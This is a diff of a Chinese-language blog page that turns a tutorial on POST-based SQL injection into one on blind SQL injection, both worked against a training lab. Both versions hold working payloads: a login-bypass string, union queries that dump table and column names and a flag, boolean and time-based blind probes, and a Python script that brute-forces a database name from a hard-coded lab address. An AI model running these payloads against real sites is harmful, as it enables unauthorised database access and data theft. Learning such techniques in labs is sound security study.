@@ -7,7 +7,7 @@
 
 
 
-<title>POST/HEAD注入 | Hexo</title>
+<title>SQL注入之盲注 | Hexo</title>
 
 
 
@@ -169,7 +169,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">POST/HEAD注入</h1>
+            <h1 class="post-title">SQL注入之盲注</h1>
             
                 <div class="post-meta">
                     
@@ -178,7 +178,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">October 15, 2019&nbsp;&nbsp;18:07:54</a>
+                        Date: <a href="#">October 18, 2019&nbsp;&nbsp;19:05:56</a>
                         </span>
                     
                     
@@ -187,48 +187,69 @@
         </header>
 
         <div class="post-content">
-            <h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p><strong>万能密码</strong></p>
-<p>最经典的POST注入 </p>
-<pre><code>&apos;or1=1#</code></pre><p>‘为闭合 闭合前面的单引号 否则会认为输入的是字符串</p>
-<p><em>#</em> 为注释掉后边的代码内容</p>
-<p>数据库判断</p>
-<pre><code>username=&apos;&apos; and pssword=&apos;&apos;</code></pre><p>讲万能密码插入后为</p>
-<p>username=’’ and (password=’’or 1=1 )</p>
-<p>前半句为真 后半句也为真 </p>
-<p>提示登陆成功</p>
-<p>还可以用limit排序查询    limit1,limit2…..</p>
-<p><strong>两个POST注入的关键条件</strong></p>
-<p>第一个是用户能够控制输入</p>
-<p>第二个是原本程序要执行的代码，拼接了用户输入的数据</p>
-<p><strong>POST注入的高危点：</strong></p>
-<p>登录框,查询框,各种和数据库有交互的框。</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>先闭合 </p>
-<p>可以使用’ “ ‘) “)等</p>
-<p>输入”时回显正常，<br>输入’时报错</p>
-<p>证明’闭合有效<br><img src="https://s2.ax1x.com/2019/10/16/KPh1W6.png" alt="KPh1W6.png"></p>
-<p>输入：<code>&#39; and 1=1 # )</code></p>
-<p><img src="https://s2.ax1x.com/2019/10/16/KPhJyD.png" alt="KPhJyD.png"></p>
-<p>回显正常</p>
-<p>说明<strong>存在注入点</strong><br>并要用’)进行闭合 方能进行查询</p>
-<p><strong>order by 语句查询字段</strong></p>
-<p> ‘order by 3 #)<br>报错</p>
-<p><img src="https://s2.ax1x.com/2019/10/16/KPhBfP.png" alt="KPhBfP.png"></p>
-<p>‘order by 2 #)<br>  回显正常 说明有两个字段</p>
-<p><img src="https://s2.ax1x.com/2019/10/16/KPhy6S.png" alt="KPhy6S.png"></p>
-<p><strong>使用union 联合查询 显错点，输出点</strong></p>
-<p>构造语句</p>
-<pre><code>&apos; union select 1,2 #）</code></pre><p>爆出字段为 1，2</p>
-<p><img src="https://s2.ax1x.com/2019/10/16/KP4Pne.png" alt="KP4Pne.png"></p>
-<p><strong>爆出数据库名</strong></p>
-<pre><code>&apos; union select 1,database() #)</code></pre><p> 为security</p>
-<p><img src="https://s2.ax1x.com/2019/10/16/KP4DE9.png" alt="KP4DE9.png"></p>
-<p><strong>爆表名</strong><br>构造语句为</p>
-<pre><code>&apos; union select 1,group_concat(table_name)from information_schema.tables where table_schema=&quot;security&quot;#）</code></pre><p><img src="https://s2.ax1x.com/2019/10/16/KP47Ct.png" alt="KP47Ct.png"><br>爆出表名</p>
-<p><strong>爆字段名</strong></p>
-<pre><code>&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=“zkaq” #)</code></pre><p><img src="https://img-blog.csdnimg.cn/20190408141520240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDk3Nzc3,size_16,color_FFFFFF,t_70" alt></p>
-<p><strong>查询字段内容</strong></p>
-<pre><code>&apos; union select group_concat(flag),group_concat(zKaQ) from zkaq #)</code></pre><p><img src="https://s2.ax1x.com/2019/10/16/KP58qe.png" alt="KP58qe.png"></p>
-<p>得到FLAG</p>
+            <h2 id="盲注原理"><a href="#盲注原理" class="headerlink" title="盲注原理"></a>盲注原理</h2><p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。</p>
+<p>先看几个函数  关于盲注的</p>
+<pre><code>1. Length（）函数 返回字符串的长度
+2. Substr（）截取字符串
+3. Ascii（）返回字符的ascii码
+4. sleep(n)：将程序挂起一段时间 n为n秒
+5. if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</code></pre><p>盲注一般分为<strong>两种</strong> </p>
+<p>布尔型和时间型 （也就是常说的延迟注入）</p>
+<p><strong>布尔型</strong>：很简单 就是页面只返回True或Fales两种类型。利用页面返回的不同,逐个猜测。</p>
+<pre><code>&gt; ?id=1&apos;and (length(database()))&gt;10</code></pre><p>当前数据库database（）的长度大于10，返回true页面，否则FALSE页面</p>
+<p>报错型：构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</p>
+<pre><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</code></pre><p>count(*)计数   concat()连接字符   floor()重复数据，返回0,1两个值  group by 进行分组 rand(0)避免数据重复造成的错误</p>
+<p><strong>时间型</strong>：通过页面沉睡时间判断</p>
+<p>通过 sleep（）函数测试，通过if（）和sleep（）联合逐个猜解数据</p>
+<pre><code>?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),sleep(4))  --+ </code></pre><p>如果当前查询的当前数据库ascii(substr(database()),1,1)的第一个字符的ASCII码大于100，ture 沉睡10秒，FALSE 沉睡4秒</p>
+<h2 id="靶场讲解"><a href="#靶场讲解" class="headerlink" title="靶场讲解"></a>靶场讲解</h2><p>?id=1   页面返回True</p>
+<p><img src="https://s2.ax1x.com/2019/10/18/KZzemT.png" alt="KZzemT.png"></p>
+<p>输入 ?id=1 ‘   用’闭合   发现页面报错Flase页面，初步判断存在注入点   </p>
+<p><img src="https://s2.ax1x.com/2019/10/18/KeSlVS.png" alt="KeSlVS.png"></p>
+<p>知道为盲注布尔型注入，利用上面的函数进行猜解</p>
+<p>SQL语句为</p>
+<pre><code>SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1</code></pre><p>后台执行结果SELECT * FROM users WHERE id=’1’’ 原因单引号在闭合后还存在一个单引号。会引起查询报错</p>
+<p>知道为盲注布尔型注入，利用上面的函数进行猜解</p>
+<p>猜当前数据库第一个字符：(下面代码还需进行编码)</p>
+<pre><code>?id=1&apos;and ascii(substr(database(),1,1))&gt;114--+</code></pre><p><img src="https://s2.ax1x.com/2019/10/18/Kepfln.png" alt="Kepfln.png"></p>
+<p>利用二分法，115为fal，114TRUE，数据库第一个字符ASCII为115，即s</p>
+<p>同理修改substr(database(),2,1)可猜第二个字符，之后同理，当然在猜数据库字符前也可先猜数据库长度：length（database()）</p>
+<p>数据库名长度大于7时回显正常  大于8时报错  说明数据库名的长度 小于等于8</p>
+<p><img src="https://s2.ax1x.com/2019/10/18/KePmFS.png" alt="KePmFS.png"></p>
+<p>?id=1’ and ascii(substr(database(),1,1))&gt;114# 这条语句在后台为：</p>
+<pre><code>SELECT * FROM users WHERE id=&apos;1&apos; and ascii(substr(database(),1,1))&gt;114#&apos;（后面单引号被#注释掉）</code></pre><p>一个一个猜太累了    各种百度写了一个Python脚本…</p>
+<pre><code>import requests
+def database_len():
+    for i in range(1,10):
+        url = &apos;&apos;&apos;http://59.63.200.79:8812/New/BlindBased/RankOne/sql-one/&apos;&apos;&apos;
+        payload = &apos;&apos;&apos;?id=1&apos; and length(database())&gt;%s&apos;&apos;&apos; %i
+        # print(url+payload+&apos;%23&apos;)
+        r = requests.get(url+payload+&apos;--+&apos;)
+        if &apos;You are in&apos; in r.text:
+            print(i)
+
+        else:
+            #print(&apos;false&apos;)
+            print(&apos;database_length:&apos;,i)
+            break
+database_len()
+
+def database_name():
+    name = &apos;&apos;
+    for j in range(1,9):
+        for i in &apos;sqcwertyuioplkjhgfdazxvbnm&apos;:
+            url = &quot;http://59.63.200.79:8812/New/BlindBased/RankOne/sql-one/?id=1&apos; and substr(database(),%d,1)=&apos;%s&apos;&quot; %(j,i)
+            # print(url+&apos;%23&apos;)
+            r = requests.get(url+&apos;--+&apos;)
+            if &apos;You are in&apos; in r.text:
+                name = name+i
+
+                print(name)
+
+                break
+    print(&apos;database_name:&apos;,name)
+
+database_name()</code></pre><p><img src="https://s2.ax1x.com/2019/10/18/Kek2fU.png" alt="Kek2fU.png"></p>
 
         </div>
 
@@ -243,7 +264,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://yoursite.com/2019/10/15/POSTHEAD注入/">http://yoursite.com/2019/10/15/POSTHEAD注入/</a></span>
+                        <span><a href="http://yoursite.com/2019/10/18/盲注/">http://yoursite.com/2019/10/18/盲注/</a></span>
                     </p>
                 
                 
@@ -276,10 +297,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2019/10/18/盲注/">SQL注入之盲注</a>
             
-            
-            <a class="next" rel="next" href="/2019/10/15/SQL显错注入/">SQL显错注入</a>
+            <a class="next" rel="next" href="/2019/10/15/POSTHEAD注入/">POST/HEAD注入</a>
             
         </section>
 
